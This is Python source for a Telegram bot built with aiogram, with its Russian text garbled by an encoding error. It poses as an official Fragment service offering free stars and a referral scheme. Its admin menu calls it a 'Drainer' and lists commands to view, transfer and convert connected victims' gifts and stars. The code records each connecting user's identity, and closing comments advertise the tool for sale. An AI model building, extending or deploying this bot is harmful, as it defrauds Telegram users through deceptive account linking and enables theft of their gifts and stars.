from aiogram import Bot, Dispatcher, F
from aiogram import types
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import (
    GetBusinessAccountStarBalance,
)
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars


from custom_methods import (
    GetFixedBusinessAccountStarBalance,
    GetFixedBusinessAccountGifts,
)

import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re

import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()


def load_json_file(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞.")
        return []


def clear_connections():
    with open("business_connections.json", "w", encoding="utf-8") as f:
        f.write("[]")


def get_connection_id_by_user(user_id: int) -> str:
    # –ü—Ä–∏–º–µ—Ä: –∑–∞–≥—Ä—É–∂–∞–µ–º –∏–∑ —Ñ–∞–π–ª–∞ –∏–ª–∏ —Å–ª–æ–≤–∞—Ä—è
    import json

    with open("connections.json", "r", encoding="utf-8") as f:
        data = json.load(f)
    return data.get(str(user_id))


def load_connections():
    with open("business_connections.json", "r", encoding="utf-8") as f:
        return json.load(f)


async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #{user_id} –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞.")
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")


def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name,
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(
            business_connection.user.id,
            "–í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–∏–ª–∏ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –∫ —Å–∏—Å—Ç–µ–º–µ Fragment!",
        )

        save_business_connection_data(business_connection)

        logging.info(
            f"–ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω: {business_connection.user.id}, connection_id: {business_connection}"
        )
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")


@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="üõ†Ô∏è –ü–æ–¥–∫–ª—é—á–∏—Ç—å", callback_data="connect"),
            ],
            [
                InlineKeyboardButton(
                    text="üåé –ó–∞—Ä–∞–±–æ—Ç–∞—Ç—å –∑–≤–µ–∑–¥—ã", callback_data="earn_stars"
                )
            ],
        ]
    )

    username = message.from_user.username

    if message.from_user.id != ADMIN_ID:
        await bot.send_photo(
            message.from_user.id,
            "https://cdn.lifehacker.ru/wp-content/uploads/2024/02/Kak-podarit-Telegram-Premium-i-chto-eto-dast_1677532117-1280x640_1708508305-1024x512.jpg",
            caption=f"""<b>
üéÅ <b>–ü—Ä–∏–≤–µ—Ç{f", @{username}" if username else ""}!</b>  

<blockquote>–Ø - GiftCalmer, –±–æ—Ç, —Å–æ–∑–¥–∞–Ω–Ω—ã–π —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤ Telegram –∫ —Å–∏—Å—Ç–µ–º–µ Fragment (Official Telegram Web) –∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –≤—ã–¥–∞—á–µ–π –∑–≤–µ–∑–¥ –∑–∞ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å!</blockquote>

ü§ñ <b>–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?</b>  
1 - –î–æ–±–∞–≤—å –º–µ–Ω—è –≤ —Å–≤–æ–π –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç.
2 - –Ø –ø–æ–¥–∫–ª—é—á—É —Ç–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –∫ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–π –ø–ª–∞—Ç—Ñ–æ—Ä–º–µ Fragment.
3 - –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –Ω–∞—á–Ω–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –≤—ã–¥–∞—á–∞ –∑–≤–µ–∑–¥ - —Ü–∏—Ñ—Ä–æ–≤—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –∑–∞ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –∏ —Ä–∞–∑–≤–∏—Ç–∏–µ —Ç–≤–æ–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ –Ω–∞—à–µ–º –±–æ—Ç–µ.

<blockquote>‚≠ê –ó–≤–µ–∑–¥—ã –º–æ–∂–Ω–æ: –æ–±–º–µ–Ω–∏–≤–∞—Ç—å, –∫–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞—Ç—å, –ø—Ä–æ–¥–∞–≤–∞—Ç—å, –¥–∞—Ä–∏—Ç—å, –ø–æ–∫—É–ø–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏, —É–ª—É—á—à–∞—Ç—å.</blockquote>

üõ†Ô∏è <b>–ù–µ –∑–Ω–∞–µ—à—å –∫–∞–∫ –ø–æ–¥–∫–ª—é—á–∏—Ç—å?</b>  
–ù–µ –ø–µ—Ä–µ–∂–∏–≤–∞–π - –Ω–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É ¬´üõ†Ô∏è –ü–æ–¥–∫–ª—é—á–∏—Ç—å¬ª –≤–Ω–∏–∑—É, –∏ —è –ø–æ–∫–∞–∂—É –ø–æ—à–∞–≥–æ–≤—É—é –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é. –í—Å–µ –ø—Ä–æ—Å—Ç–æ –∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ.

ü§ù <b>–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞:</b>
–ü—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π, —á—Ç–æ–±—ã –∑–∞—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∑–≤–µ–∑–¥—ã! 
üå† –ó–∞ –∫–∞–∂–¥–æ–≥–æ –¥—Ä—É–≥–∞, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–¥–∫–ª—é—á–∏—Ç –±–æ—Ç–∞ - —Ç—ã –ø–æ–ª—É—á–∏—à—å +25 –∑–≤–µ–∑–¥ –Ω–∞ —Å–≤–æ–π —Å—á–µ—Ç. 
</b> """,
            reply_markup=keyboard,
            parse_mode="html",
        )
    else:
        await message.answer(
            f"Antistoper Drainer\n\nüîó –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {count}\n\n/gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã\n/stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n/transfer <owned_id> <business_connect> - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é\n/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã\n/clear_connections - —É–¥–∞–ª–∏—Ç—å –í–°–ï –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è"
        )


@dp.callback_query(F.data == "earn_stars")
async def earn_stars(callback: CallbackQuery):
    user_id = callback.message.from_user.id

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="üí≤ –í—ã–≤–æ–¥", callback_data="withdraw")],
            [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="back")],
        ]
    )

    await bot.send_photo(
        callback.from_user.id,
        "https://images.ctfassets.net/dfcvkz6j859j/7wGcHvbDYkq94dEcRtTrHq/e07b49985aa70df068e72d40719f4b03/5_Simple_Strategies_to_Get_More_Client_Referrals_for_Your_Agency.png",
        caption=f"""<b>ü§ù –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ —É –Ω–∞—Å –æ—á–µ–Ω—å –ø—Ä–æ—Å—Ç–∞—è –∏ –≤—ã–≥–æ–¥–Ω–∞—è –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.

<blockquote>- üîç –ò—â–µ–º –ª—é–¥–µ–π, –∫–∏–¥–∞–µ–º —Å—Å—ã–ª–∫—É, —á–µ–ª–æ–≤–µ–∫ –ø–æ–¥–≤—è–∑—ã–≤–∞–µ—Ç –Ω–∞—à–µ–≥–æ –±–æ—Ç–∞ –∫ –∞–∫–∫–∞—É–Ω—Ç—É, –≤–∞–º –≤—ã–¥–∞–µ—Ç—Å—è –±–∞–ª–∞–Ω—Å –≤ 25 ‚≠ê
- üíº –í—ã–≤–æ–¥ –æ—Ç 100 ‚≠ê</blockquote>

‚õèÔ∏è –î–æ–±—ã—Ç–æ –∑–≤–µ–∑–¥ (–∑–∞ –≤–∞—à–∏—Ö —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤): 0 ‚≠ê
‚Ü≥ –í–∞—à–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏—è –¥—Ä—É–∑–µ–π:
<code>https://t.me/gift_calmer_bot?start=ref{user_id}</code></b>""",
    reply_markup=keyboard,
    parse_mode="html"
    )

async def main():
    print("–° –ª—é–±–æ–≤—å—é –æ—Ç @volodimirus")
    await dp.start_polling(bot)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())

print("–ü–û–ö–£–ü–ö–ê @volodimirus")

# –ü–û–ö–£–ü–ö–ê @volodimirus
#                                              –ü–û–ö–£–ü–ö–ê @volodimirus
#               –ü–û–ö–£–ü–ö–ê @volodimirus
#                                                                    –ü–û–ö–£–ü–ö–ê @volodimirus
#                                                                                                                       –ü–û–ö–£–ü–ö–ê @volodimirus
#                       –ü–û–ö–£–ü–ö–ê @volodimirus
#                                                                           –ü–û–ö–£–ü–ö–ê @volodimirus
#       –ü–û–ö–£–ü–ö–ê @volodimirus